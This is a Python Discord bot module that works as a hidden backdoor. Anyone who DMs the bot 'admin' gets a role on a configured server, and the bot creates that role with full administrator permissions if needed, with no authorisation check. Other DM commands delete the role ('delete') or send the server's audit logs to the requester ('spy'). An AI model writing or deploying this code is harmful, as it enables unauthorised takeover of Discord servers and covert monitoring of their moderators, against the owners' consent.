import discord
from discord.ext import commands

def get_settings():
    settings = {}
    try:
        with open('data.txt', 'r', encoding='utf-8') as file:
            for line in file:
                if line.startswith('TOKEN='):
                    settings['TOKEN'] = line.strip().split('=')[1]
                elif line.startswith('ADMIN_SERVER='):
                    settings['ADMIN_SERVER'] = line.strip().split('=')[1]
                elif line.startswith('ROLE_NAME='):
                    settings['ROLE_NAME'] = line.strip().split('=')[1]
    except FileNotFoundError:
        print("data.txt not found")
    return settings

settings = get_settings()
TOKEN = settings.get('TOKEN')
ROLE_NAME = settings.get('ROLE_NAME')
ADMIN_SERVER = int(settings.get('ADMIN_SERVER'))

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.guild_scheduled_events = True
intents.members = True

class AdminCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_message(self, message):
        if message.author.bot:
            return

        if isinstance(message.channel, discord.DMChannel):
            if message.content.startswith('admin'):
                await self.admin_command(message)
            
            elif message.content.startswith('delete'):
                await self.delete_command(message)
                
            elif message.content.startswith('spy'):
                await self.spy_command(message)

    async def admin_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return
        
        member = guild.get_member(message.author.id)
        if member is None:
            member = await guild.fetch_member(message.author.id)

        if member is None:
            await message.channel.send(f"Member not found in server `{guild.name}`.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if not role:
            role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))

        if role in member.roles:
            await message.channel.send(f"You already have the `{ROLE_NAME}` role.")
        else:
            await member.add_roles(role)
            await message.channel.send(f"Added `{ROLE_NAME}` role to you.")

    async def delete_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return

        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role:
            await role.delete()
            await message.channel.send(f"Deleted `{ROLE_NAME}` role.")
        else:
            await message.channel.send(f"`{ROLE_NAME}` role does not exist.")

    async def spy_command(self, message):
        guild = self.bot.get_guild(ADMIN_SERVER)
        if guild is None:
            await message.channel.send("Server not found.")
            return

        try:
            audit_logs = []
            async for log in guild.audit_logs(limit=10):
                audit_logs.append(log)

            log_messages = []
            for log in reversed(audit_logs):
                action = log.action
                user = log.user.name if log.user else 'Unknown'
                target = log.target
                reason = log.reason if log.reason else 'None'
                timestamp = log.created_at.strftime("%Y-%m-%d %H:%M:%S")

                log_message = f"**{timestamp}** - **Action:** {action}\n**User:** {user}\n**Target:** {target}\n**Reason:** {reason}\n"
                log_messages.append(log_message)

            response_message = '\n'.join(log_messages)
            await message.channel.send(f"```\n{response_message}\n```")
        except Exception as e:
            await message.channel.send(f"Error getting audit logs: {e}")
            print(f"Error getting audit logs: {e}")

async def setup(bot):
    await bot.add_cog(AdminCog(bot))

if __name__ == "__main__":
    bot = commands.Bot(command_prefix='!', intents=intents)
    bot.load_extension('admin')
    bot.run(TOKEN)
